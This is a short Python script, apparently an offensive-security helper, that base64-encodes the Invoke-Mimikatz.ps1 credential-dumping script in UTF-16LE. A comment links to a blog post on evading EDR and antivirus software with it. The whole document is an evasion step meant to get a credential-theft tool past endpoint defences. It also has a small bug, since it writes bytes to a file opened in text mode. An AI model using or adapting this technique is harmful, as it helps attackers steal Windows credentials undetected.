# https://rzemieniecki.wordpress.com/2019/08/02/evading-edr-av-software-with-invoke-mimikatz-ps1/

# https://docs.python.org/3/library/codecs.html#standard-encodings


import base64

raw = open('Invoke-Mimikatz.ps1', 'r').read()
b64 = base64.b64encode(raw.encode('utf-16-le'))
open('eInvoke_Mimikatz.txt', 'w').write(b64)
